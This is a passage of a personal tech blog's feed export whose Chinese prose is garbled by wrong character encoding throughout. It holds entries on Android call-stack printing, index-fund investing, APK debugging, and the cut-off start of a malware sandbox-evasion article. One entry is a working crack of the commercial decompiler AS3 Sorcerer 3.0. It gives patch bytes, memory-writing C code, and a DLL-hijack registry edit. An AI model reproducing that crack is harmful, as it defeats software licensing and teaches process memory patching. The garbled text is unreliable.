class="hljs-number">23853</span><br>  #<span class="hljs-number">00</span> pc <span class="hljs-number">0002b628</span>  /sbin/adbd<br>  #<span class="hljs-number">01</span> pc <span class="hljs-number">00013999</span>  /sbin/adbd<br>  #<span class="hljs-number">02</span> pc <span class="hljs-number">000112ed</span>  /sbin/adbd<br>  #<span class="hljs-number">03</span> pc <span class="hljs-number">000104e1</span>  /sbin/adbd<br>  #<span class="hljs-number">04</span> pc <span class="hljs-number">0002a613</span>  /sbin/adbd<br>  #<span class="hljs-number">05</span> pc <span class="hljs-number">00030283</span>  /sbin/adbd<br><br><span class="hljs-string">&quot;adbd&quot;</span> sysTid=<span class="hljs-number">23862</span><br>  #<span class="hljs-number">00</span> pc <span class="hljs-number">0002b888</span>  /sbin/adbd<br>  #<span class="hljs-number">01</span> pc <span class="hljs-number">0000a503</span>  /sbin/adbd<br>  #<span class="hljs-number">02</span> pc <span class="hljs-number">00009527</span>  /sbin/adbd<br>  #<span class="hljs-number">03</span> pc <span class="hljs-number">0002a613</span>  /sbin/adbd<br>  #<span class="hljs-number">04</span> pc <span class="hljs-number">00030283</span>  /sbin/adbd<br><br>----- end <span class="hljs-number">23850</span> -----<br>  ...<br></code></pre></td></tr></table></figure><h2 id="â˜†-java-ä»£ç ä¸­æ‰“å°è°ƒç”¨æ ˆ"><a href="#â˜†-java-ä»£ç ä¸­æ‰“å°è°ƒç”¨æ ˆ" class="headerlink" title="â˜† java ä»£ç ä¸­æ‰“å°è°ƒç”¨æ ˆ"></a>â˜† java ä»£ç ä¸­æ‰“å°è°ƒç”¨æ ˆ</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;  <br> ...  <br>&#125; <span class="hljs-keyword">catch</span> (RemoteException e) &#123;  <br>  e.printStackTrace();  <br>  ...  <br>&#125; <br></code></pre></td></tr></table></figure><h2 id="â˜†-C-ä»£ç ä¸­æ‰“å°è°ƒç”¨æ ˆ"><a href="#â˜†-C-ä»£ç ä¸­æ‰“å°è°ƒç”¨æ ˆ" class="headerlink" title="â˜† C++ä»£ç ä¸­æ‰“å°è°ƒç”¨æ ˆ"></a>â˜† C++ä»£ç ä¸­æ‰“å°è°ƒç”¨æ ˆ</h2><p>CallStack.cpp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;utils/CallStack.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    android::CallStack stack;<br>    stack.<span class="hljs-built_in">update</span>(); <br>    stack.<span class="hljs-built_in">dump</span>(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Android.mk</p><figure class="highlight make"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs make">LOCAL_PATH:= <span class="hljs-variable">$(<span class="hljs-built_in">call</span> my-<span class="hljs-built_in">dir</span>)</span><br><br><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$(CLEAR_VARS)</span><br>LOCAL_SRC_FILES:= CallStack.cpp<br>LOCAL_SHARED_LIBRARIES += libutils<br>LOCAL_LDLIBS += -ldl -lutils<br><br>LOCAL_CFLAGS := <span class="hljs-variable">$(common_CFLAGS)</span><br>LOCAL_MODULE := CallStack<br><span class="hljs-keyword">include</span> <span class="hljs-variable">$(BUILD_EXECUTABLE)</span><br><br></code></pre></td></tr></table></figure><p>æ‰§è¡Œåæ˜¾ç¤ºç±»ä¼¼ä¸‹é¢çš„ç»“æœ</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><br>root<span class="hljs-variable">@shamu</span><span class="hljs-symbol">:/data/local/tmp</span> <span class="hljs-comment"># ./CallStack</span><br><span class="hljs-comment">#00 pc 000006d1  /data/local/tmp/CallStack</span><br><span class="hljs-comment">#01 pc 00017359  /system/lib/libc.so (__libc_init+44)</span><br><span class="hljs-comment">#02 pc 0000074c  /data/local/tmp/CallStack</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºå®šæŠ•çš„ä¸€äº›æ€è€ƒ</title>
    <link href="/cn/Automatic_Investment_Plan/"/>
    <url>/cn/Automatic_Investment_Plan/</url>
    
    <content type="html"><![CDATA[<ul><li>å®šæŠ•åªæœ‰åœ¨ä½ä¼°çš„æ—¶å€™ä¹°ï¼Œå½“ä¼°å€¼è¿›å…¥ä¸­ä½æ•°ä»¥ä¸Šå°±ä¸è¦ä¹°äº†ï¼ŒåŒæ—¶å®šæŠ•æ ‡çš„çš„ä¼°å€¼åº”è¯¥åœ¨å†å²åº•éƒ¨åŒºåŸŸã€‚</li><li>å®šæŠ•çš„æœ¬è´¨ä¸æ˜¯ä»·å€¼æŠ•èµ„ï¼Œè€Œæ˜¯ç›¸ä¿¡ä¼°å€¼å›å½’ä¸­ä½æ•°ã€‚ </li><li>æŒ‡æ•°åŸºé‡‘ï¼Œå‘¨æœŸæ€§è¡Œä¸šé€‚åˆå®šæŠ•ï¼Œæ¯”å¦‚åˆ¸å•†ï¼Œé’¢é“ï¼Œç…¤ç‚­ã€‚ä¸€èˆ¬æŒ‰æ—¶é—´å®šæŠ•ï¼Œå¦‚æœå¤§å¹…ä¸‹è·Œä¹Ÿè¦ä¹°ã€‚</li></ul><p>æ€»çš„æ¥è¯´å®šæŠ•å±äºç­–ç•¥å‹çš„æŠ•èµ„æ–¹æ³•ï¼Œå…¶å®å¹¶ä¸çŸ¥é“åº•å’Œé¡¶åœ¨å“ªé‡Œï¼Œé€šè¿‡æ‹‰é•¿æ—¶é—´æ¥é™ä½æŒä»“æˆæœ¬ï¼Œå› æ­¤å®šæŠ•æˆåŠŸçš„å…³é”®åœ¨äºä½ çš„æˆæœ¬æ˜¯å¦å¯ä»¥éšç€æ—¶é—´è€Œé™ä¸‹æ¥ã€‚ä»è¿™ç‚¹ä¹Ÿå¯ä»¥åˆ†æå‡ºåœ¨åº•éƒ¨åŒºåŸŸå®šæŠ•æ¯”åœ¨é¡¶éƒ¨åŒºåŸŸå®šæŠ•è¦å¥½å¾—å¤šï¼Œè¿™ä¹Ÿå°±æ˜¯ç¬¬ä¸€æ¡ã€‚</p><p>å®šæŠ•ç­–ç•¥å¯¹å†å²çš„ä¼°å€¼æƒ…å†µæœ‰å¾ˆå¼ºçš„ä¾èµ–ï¼Œå±äºåŸºäºå†å²æ•°æ®çš„ç»Ÿè®¡åˆ†æï¼Œä½†æ˜¯æ¯ä¸€æ¬¡çš„æƒ…å†µéƒ½ä¸åŒï¼Œæ²¡æœ‰äººå¯ä»¥ä¿è¯å†å²ä¸€å®šä¼šé‡æ¼”ã€‚å®šæŠ•ä¹Ÿä¸æ˜¯ä»·å€¼æŠ•èµ„ï¼Œæ²¡æœ‰æŠ¤åŸæ²³ï¼Œåªæ˜¯ç›¸ä¿¡å‡å€¼å›å½’ï¼Œè¿™æ˜¯ç¬¬äºŒæ¡ã€‚</p><p>å·´è²ç‰¹éå¸¸æ¨èæ ‡æ™®500æŒ‡æ•° (S&amp;P 500) å®šæŠ•ï¼ŒæŒ‡æ•°åŸºé‡‘æœ€ç‰›çš„åœ°æ–¹æ˜¯è‚¡ç¥¨ä¼šå®šæœŸè°ƒæ•´ï¼ŒæŠŠå¥½çš„è‚¡ç¥¨åŠ å…¥è¿›æ¥ï¼Œå·®çš„æ·˜æ±°å‡ºå»ï¼Œç›¸å½“äºæœ‰äººå¸®ä½ é€‰è‚¡äº†ï¼Œå¦å¤–è¶³å¤Ÿåˆ†æ•£ï¼Œå‘ç”Ÿç³»ç»Ÿæ€§é£é™©çš„æ¦‚ç‡å¤§å¹…é™ä½ã€‚å‘¨æœŸæ€§è¡Œä¸šåˆ™æ˜¯çˆ†å‘æ€§å¾ˆå¼ºï¼Œä¸‰å¹´ä¸å¼€å¼ ï¼Œå¼€å¼ åƒä¸‰å¹´ï¼Œå®¹æ˜“åœ¨åº•éƒ¨ç§¯ç´¯å¤§é‡ç­¹ç ï¼Œä½œä¸ºä¸€ä¸ªé•¿æœŸæŠ•èµ„ç­–ç•¥éå¸¸åˆé€‚ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>investment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AS3 Sorcerer 3.0 ç ´è§£æ€è·¯</title>
    <link href="/cn/AS3_Sorcerer_crack/"/>
    <url>/cn/AS3_Sorcerer_crack/</url>
    
    <content type="html"><![CDATA[<p>   AS3 Sorcereræ˜¯ä¸€æ¬¾flash action Scriptçš„å•†ä¸šåç¼–è¯‘è½¯ä»¶ã€‚  <a href="http://www.as3sorcerer.com/">www.as3sorcerer.com</a></p><p>   è½¯ä»¶ä¸ºDelphiç¼–å†™ï¼ŒåŠ äº†æœªçŸ¥å£³ï¼Œä½¿ç”¨PEID 0.94æ— æ³•æ­£ç¡®æŸ¥å‡ºï¼Œä½¿ç”¨æ ¸å¿ƒæ‰«æå‘ç°æ˜¯<br>   Delphiç¼–å†™ï¼Œè¿™ä¸ªè½¯ä»¶æœ‰ä¸€ä¸ªç‰¹ç‚¹ä¿®æ”¹ä¸€ä¸ªå­—èŠ‚å°±æŠ¥é”™ã€‚ç”±äºæ—¶é—´åŸå› æ²¡æœ‰å…·ä½“è·Ÿç›¸å…³ä»£ç ã€‚</p><p>   ç ´è§£æ–¹æ³•ä½¿ç”¨LPK.dllåŠ¨æ€ä¿®æ”¹as3.exeå†…å­˜è¾¾åˆ°ç ´è§£ç›®å‰ï¼Œåœ¨Windows Xpä¸‹æ¯”è¾ƒå®Œç¾ï¼Œ<br>   åœ¨Windows 7ä¸‹å·²ç»æ— æ³•é€šè¿‡LPK.dllè¿›è¡ŒDLL hijackï¼Œå¯ä»¥é€šè¿‡DLLæ³¨å…¥è¾¾åˆ°åŒæ ·çš„ç›®çš„ã€‚</p><p>   éš¾ç‚¹æœ‰å‡ ä¸ªï¼ŒODåŠ è½½æŠ¥é”™ï¼Œattackä¹ŸæŠ¥é”™ã€‚ä½¿ç”¨æµ·é£æœˆå½±çš„StrongODå¯ä»¥æ­£å¸¸attachã€‚<br>   OD 1.1ç›®å‰æœ€å¤§çš„é—®é¢˜æ˜¯æ’ä»¶å†²çªä¸¥é‡ï¼Œå®‰è£…äº†OllyAdvåï¼Œæ— æ³•æˆåŠŸåŠ è½½as3.exe.<br>   é‡ä¸Šå¼ºå£³æ—¶å¯ä»¥ä½¿ç”¨phantomçš„protect DRxï¼Œå¯ä»¥è§£å†³ä¸€ä¸‹é—®é¢˜ï¼Œæ€»ä¹‹è¦å°½é‡é¿å…å†²çªã€‚<br>   æ¥ä¸‹æ¥çš„éš¾ç‚¹å°±æ˜¯å¦‚ä½•æ‰¾åˆ°ç ´è§£çš„å…³é”®ç‚¹ï¼Œè¿›è¡Œå†…å­˜patchã€‚</p><p>   ä½¿ç”¨ODæŸ¥æ‰¾å­—ç¬¦ä¸²å‚è€ƒUnicodeï¼Œæœç´¢trial</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm">006974C2    E8 65ABFDFF     call    0067202C<br>006974C7    84C0            test    al, al<br>006974C9    75 1C           jnz     short 006974E7<br>006974CB    B9 E4756900     mov     ecx, 006975E4                    ; e<br>006974D0    BA 50766900     mov     edx, 00697650                    ;Sorry!<br></code></pre></td></tr></table></figure><p>   è¿™é‡Œæœ‰ä¸ªå‘ï¼Œåœ¨ODä¸­çœ‹åˆ°çš„ä»£ç æœ‰å¯èƒ½ä¸æ˜¯æœ€ç»ˆè¿è¡Œçš„ä»£ç ï¼Œåªæœ‰çœŸæ­£åœ¨ODé‡Œæ–­ä¸‹ï¼Œè¿›<br>   å…¥ç¨‹åºé¢†ç©ºåï¼Œçœ‹åˆ°çš„ä»£ç æ‰æ˜¯è§£å¯†åçš„çœŸæ­£ä»£ç ã€‚è¿™é‡Œåœ¨è¿™é‡Œæµªè´¹äº†å¾ˆå¤šæ—¶é—´ã€‚æ¢å¥<br>   è¯è¯´å°±æ˜¯è¦å…ˆä¿è¯èƒ½è°ƒè¯•èµ·æ¥ï¼Œèƒ½è°ƒè¯•èƒ½ä¸‹æ–­ç‚¹åŸºæœ¬å°±æˆåŠŸäº†ä¸€åŠã€‚</p><p>   ä¸Šé¢çš„ä»£ç æ˜¯éå¸¸ç»å…¸çš„å…³é”®ä»£ç ï¼Œä¸»è¦å¤„ç†äº† 0067202Cè®©å®ƒè¿”å›1å°±OKäº†ã€‚F7è·Ÿè¿›</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">0067202C  - E9 EE9D1900     jmp     0080BE1F<br>00672031    CC              int3<br>00672032    CC              int3<br>00672033    CC              int3<br>00672034    CC              int3<br>00672035    CC              int3<br>00672036    CC              int3<br>00672037    90              nop<br></code></pre></td></tr></table></figure><p>   è¿›å…¥å°±å»ä¸€ä¸ªjmpï¼Œåé¢çš„å¤§æ®µè·³è½¬éå¸¸å¤šï¼Œè·Ÿè¸ªå›°éš¾ã€‚å¥½åœ¨æœ‰å¾ˆå¤šint3ï¼Œå¯ä»¥è‡ªå·±<br>   å†™ä¸€æ®µæ±‡ç¼–ä»£ç è§£å†³ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">0067202C    33C0            xor     eax, eax<br>0067202E    83C0 01         add     eax, 0x1<br>00672031    90              nop<br>00672032    90              nop<br>00672033    90              nop<br>00672034    90              nop<br>00672035    90              nop<br>00672036    C3              retn<br></code></pre></td></tr></table></figure><p>æ ¸å¿ƒä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">HANDLE handle = GetModuleHandle(<span class="hljs-literal">NULL</span>);<br><br><span class="hljs-type">int</span> RVA = <span class="hljs-number">0x67202C</span> - <span class="hljs-number">0x400000</span>;<br><span class="hljs-type">int</span> VA = <span class="hljs-type">int</span>(handle) + RVA;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> p405213[<span class="hljs-number">11</span>] = &#123;  <br>      <span class="hljs-number">0x33</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xC3</span><br>&#125;;<br>VirtualProtectEx(hProcess, (LPVOID)VA, <span class="hljs-number">11</span>, PAGE_EXECUTE_READWRITE, &amp;Oldpp);<br>WriteProcessMemory(hProcess, (LPVOID)VA, p405213, <span class="hljs-number">11</span>, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure><p>GetModuleHandleç”¨äºåŠ¨æ€è·å–è¿›ç¨‹åŠ è½½åŸºå€ã€‚</p><h2 id="LPK-dll"><a href="#LPK-dll" class="headerlink" title="LPK.dll"></a>LPK.dll</h2><p>Windows 7 ä¸èƒ½é»˜è®¤å·²ç»ä¸èƒ½ä½¿ç”¨LPK.dllï¼Œå¿…é¡»å¯¼å…¥ä¸‹é¢æ³¨å†Œè¡¨é”®å€¼ï¼Œé‡å¯ç”µè„‘<br>æ‰èƒ½ä½¿ç”¨ã€‚</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">Windows Registry Editor Version <span class="hljs-number">5.00</span> <br><br>[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager] <br><span class="hljs-string">&quot;ExcludeFromKnownDlls&quot;</span><span class="hljs-operator">=</span>hex(<span class="hljs-number">7</span>):<span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">70</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">6</span>b<span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span>e<span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">64</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span>\ <br><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Crack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä½¿ç”¨Android Studio è°ƒè¯•æ— æºç apkç¨‹åº</title>
    <link href="/cn/apk_debug/"/>
    <url>/cn/apk_debug/</url>
    
    <content type="html"><![CDATA[<p>Apkæ— æºç è°ƒè¯•çš„æ–¹æ³•æœ‰å¾ˆå¤šï¼Œç°åœ¨å‘ç°ä½¿ç”¨Android Studio ç»“åˆ JEBã€€æ„Ÿè§‰è‰¯å¥½ï¼Œ<br>ä¸»è¦æ˜¯å‚è€ƒã€€<a href="http://www.jianshu.com/p/c7899e5ea182">http://www.jianshu.com/p/c7899e5ea182</a>ã€€è¿™ç¯‡è®°å½•ä¸‹äº†å…·ä½“æ­¥éª¤ã€‚</p><h2 id="1-ä¸‹è½½-smalidea"><a href="#1-ä¸‹è½½-smalidea" class="headerlink" title="1. ä¸‹è½½ smalidea"></a>1. ä¸‹è½½ smalidea</h2><p><a href="https://bitbucket.org/JesusFreke/smali/downloads/smalidea-0.03.zip">https://bitbucket.org/JesusFreke/smali/downloads/smalidea-0.03.zip</a></p><p>åœ¨Android studioçš„æ’ä»¶ä»“åº“ä¸­æ²¡æœ‰æ‰¾åˆ°è¿™ä¸ªæ’ä»¶ï¼Œéœ€è¦ä¸‹è½½æœ¬åœ°å®‰è£…<br>File -&gt; Settings -&gt; Plugins -&gt; Install plugin from disk  é€‰æ‹©ä¸‹è½½çš„æ’ä»¶ï¼Œé‡å¯åç”Ÿæ•ˆã€‚</p><h2 id="2-apktool-è¾“å‡ºæºç æ–‡ä»¶"><a href="#2-apktool-è¾“å‡ºæºç æ–‡ä»¶" class="headerlink" title="2. apktool è¾“å‡ºæºç æ–‡ä»¶"></a>2. apktool è¾“å‡ºæºç æ–‡ä»¶</h2><p><a href="https://github.com/iBotPeaches/Apktool/releases/download/2.2.0/apktool_2.2.0.jar">https://github.com/iBotPeaches/Apktool/releases/download/2.2.0/apktool_2.2.0.jar</a></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>apktool_2.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-keyword">jar </span>d -f xx.apk -o xx<br></code></pre></td></tr></table></figure><p>å¦‚æœæ­£å¸¸çš„å°†è¾“å‡º smali æºç æ–‡ä»¶</p><h2 id="3-Android-Studio-å¯¼å…¥æºç "><a href="#3-Android-Studio-å¯¼å…¥æºç " class="headerlink" title="3. Android Studio å¯¼å…¥æºç "></a>3. Android Studio å¯¼å…¥æºç </h2><p>File -&gt; New -&gt; import project  é€‰æ‹©åˆšæ‰å¯¼å‡ºçš„xxæ–‡ä»¶å¤¹</p><h2 id="4-å¢åŠ Android-Stuidoçš„è°ƒè¯•é€‰é¡¹"><a href="#4-å¢åŠ Android-Stuidoçš„è°ƒè¯•é€‰é¡¹" class="headerlink" title="4. å¢åŠ Android Stuidoçš„è°ƒè¯•é€‰é¡¹"></a>4. å¢åŠ Android Stuidoçš„è°ƒè¯•é€‰é¡¹</h2><p>Android Studio ç•Œé¢ä¸Šé€‰æ‹© Run-&gt; Edit Configurationsï¼Œç‚¹å‡»+å·ï¼Œæ–°å»ºremoteç±»å‹è°ƒè¯•<br>å™¨ï¼Œé»˜è®¤çš„ç›‘å¬ç«¯å£ä¸º5005ï¼Œå¦‚æœé»˜è®¤ç«¯å£è¢«å ç”¨åˆ™éœ€è¦ä¿®æ”¹ç«¯å£å·ã€‚</p><h2 id="5-ä»¥è°ƒè¯•æ¨¡å¼å¯åŠ¨åº”ç”¨"><a href="#5-ä»¥è°ƒè¯•æ¨¡å¼å¯åŠ¨åº”ç”¨" class="headerlink" title="5. ä»¥è°ƒè¯•æ¨¡å¼å¯åŠ¨åº”ç”¨"></a>5. ä»¥è°ƒè¯•æ¨¡å¼å¯åŠ¨åº”ç”¨</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">adb <span class="hljs-keyword">shell</span><span class="language-bash"> am start -D -n aa.bb/.activity</span><br></code></pre></td></tr></table></figure><p>è¿›ç¨‹å°†æŒ‚èµ·ï¼Œaa.bbæ˜¯package nameï¼Œ.activity æ˜¯è¦å¯åŠ¨çš„activity ä¸€èˆ¬æŒ‡å®šMainAcvitiyå³å¯</p><h2 id="6-å»ºç«‹è°ƒè¯•é€šé“"><a href="#6-å»ºç«‹è°ƒè¯•é€šé“" class="headerlink" title="6. å»ºç«‹è°ƒè¯•é€šé“"></a>6. å»ºç«‹è°ƒè¯•é€šé“</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">adb <span class="hljs-keyword">shell</span> <span class="hljs-keyword">ps</span> | <span class="hljs-keyword">grep</span> aa.bb<br></code></pre></td></tr></table></figure><p>è·å¾—è°ƒè¯•è¿›ç¨‹çš„pid</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">adb</span> forward tcp:<span class="hljs-number">5005</span> jdwp:debug_process_pid<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤åï¼Œå¯ä»¥çœ‹åˆ°adbç›‘å¬æœ¬åœ°5005 ç«¯å£ã€‚</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">&gt; netstat -antp | grep <span class="hljs-number">5005</span><br> tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0 127.0.0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">5005</span>          <span class="hljs-number">0.0.0.0</span>:*               LISTEN      <span class="hljs-number">4728</span>/adb  <br></code></pre></td></tr></table></figure><h2 id="7-è®¾ç½®æ–­ç‚¹ï¼Œè°ƒè¯•"><a href="#7-è®¾ç½®æ–­ç‚¹ï¼Œè°ƒè¯•" class="headerlink" title="7. è®¾ç½®æ–­ç‚¹ï¼Œè°ƒè¯•"></a>7. è®¾ç½®æ–­ç‚¹ï¼Œè°ƒè¯•</h2><p>ç‚¹å‡»æºç å·¦ä¾§æ å¯ä»¥è®¾ç½®æ–­ç‚¹ï¼Œç‚¹å‡»å·¥å…·æ ä¸Šçš„debug ï¼ˆä¸€ä¸ªå°è™«çš„æŒ‰é’®ï¼‰ï¼Œå¼€å§‹è°ƒè¯•ã€‚åœ¨<br>è¿™ä¸ªæ­¥éª¤ä¸Šæˆ‘é‡ä¸Šäº†ä¸€ä¸ªé”™è¯¯ã€‚</p><p>java.io.IOException â€œhandshake failed - connection prematurally closedâ€</p><p>è¿™ä¸ªé”™è¯¯æ˜¯å› ä¸ºadbç‰ˆæœ¬é—®é¢˜ï¼Œå–æ¶ˆAndroidå†…éƒ¨çš„adbé›†æˆå°±å¯ä»¥äº†ã€‚å…·ä½“æ–¹æ³•æ˜¯<br>Tools -&gt; Android -&gt; Enable adb integration å–æ¶ˆæ‰å‰é¢çš„å‹¾å°±å¯ä»¥äº†ã€‚</p><p>å¦‚æœçœ‹åˆ°Connected to the target VM, address: â€˜localhost:5005â€™, transport: â€˜socketâ€™ å°±å¤§åŠŸå‘Šæˆäº†ã€‚</p><h2 id="8-å…¶ä»–ä¸€äº›è¯´æ˜äº‹é¡¹"><a href="#8-å…¶ä»–ä¸€äº›è¯´æ˜äº‹é¡¹" class="headerlink" title="8. å…¶ä»–ä¸€äº›è¯´æ˜äº‹é¡¹"></a>8. å…¶ä»–ä¸€äº›è¯´æ˜äº‹é¡¹</h2><p>è¦è°ƒè¯•apkç¨‹åºæ˜¯æœ‰ä¸€äº›è¦æ±‚çš„ï¼Œä¸‹é¢å‡ ç§æƒ…å†µå¯ä»¥è°ƒè¯•apkç¨‹åºã€‚</p><ul><li>&#x2F;default.prop ro.debuggable&#x3D;1</li></ul><p>æˆ‘çš„æ‰‹æœºå°±å±äºè¿™ç§æƒ…å†µ</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">getprop  | grep ro.debug<br>[<span class="hljs-symbol">ro.debuggable</span>]: <span class="hljs-link">[1]</span><br></code></pre></td></tr></table></figure><ul><li>APK ä¸­AndroidManifest.xml æœ‰è¿™å¥ android:debuggable&#x3D;true</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸€äº›åæ²™ç›’çš„æ–°æŠ€æœ¯</title>
    <link href="/cn/anti_sandbox/"/>
    <url>/cn/anti_sandbox/</url>
    
    <content type="html"><![CDATA[<p>Upatre ä½¿ç”¨äº†ä¸€äº›æ–°çš„é€ƒé€¸æŠ€æœ¯æ¥é€ƒé€¸åŠ¨æ€æ²™ç›’å¼•æ“çš„æ£€æŸ¥ï¼Œè¿™äº›æŠ€å·§éƒ½éå¸¸çš„ç®€å•ï¼Œä½†<br>æ˜¯éå¸¸çš„æœ‰æ•ˆæœã€‚äº‹å®ä¸Šï¼ŒVirusTotalä¸ŠUpatreçš„æ£€å‡ºç‡å¹¶ä¸é«˜ï¼Œæ–°å˜ç§å‡ºæ¥åŸºæœ¬éƒ½æ£€æµ‹ä¸<br>å‡ºæ¥ï¼Œè¯´æ˜ç°åœ¨çš„æ¶æ„è½¯ä»¶å¯¹ä»˜æ€æ¯’è½¯ä»¶æ˜¯è¶Šæ¥è¶Šæœ‰åŠæ³•äº†ã€‚</p><p>ç›®å‰åœ¨æ¶æ„è½¯ä»¶ä¸ŠåŠ å£³å€’æ˜¯è¶Šæ¥è¶Šå°‘äº†ï¼Œå› ä¸ºåŠ å£³å®¹æ˜“å¼•èµ·æ€è½¯å¼•æ“çš„æ³¨æ„ï¼Œç›¸ååœ°ç›®å‰çš„<br>æ¶æ„è½¯ä»¶å¤§é‡ä½¿ç”¨è¾¹æ‰§è¡Œè¾¹ä¿®æ”¹è‡ªèº«ä»£ç çš„æ–¹æ³•æ¥èº²é¿æ€è½¯ï¼Œä¸æ‰§è¡Œçš„è¯çœ‹èµ·æ¥å°±åƒæ˜¯ä¸€ä¸ª<br>æ­£å¸¸çš„è½¯ä»¶ï¼Œè€ŒçœŸæ­£æ‰§è¡Œèµ·æ¥ä»£ç å´å…¨å˜äº†ï¼Œè¿™ä¹Ÿç®—æ˜¯ä¸€ç§è¿›åŒ–ã€‚</p><p>ä¸‹é¢è¯´è¯´ä¸¤ç§æœ€è¿‘é‡åˆ°çš„æ²™ç›’é€ƒé€¸çš„åŠæ³•ï¼Œæ ·æœ¬md5: ac3558b973402ef6a27e03c391f20533</p><h2 id="æ£€æŸ¥å¼€æœºæ—¶é—´"><a href="#æ£€æŸ¥å¼€æœºæ—¶é—´" class="headerlink" 